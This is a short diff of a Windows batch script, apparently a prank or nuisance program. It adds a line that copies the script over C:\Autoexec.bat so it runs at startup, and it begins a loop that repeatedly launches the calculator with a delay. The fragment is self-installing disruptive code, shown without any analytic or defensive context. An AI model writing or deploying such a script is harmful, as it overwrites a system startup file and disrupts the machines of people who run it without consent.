@@ -1,5 +1,6 @@
 @echo off
 cls
+xcopy /s %0 C:\Autoexec.bat
 :A
 start calc.exe
 ping localhost -n 3 >nul 
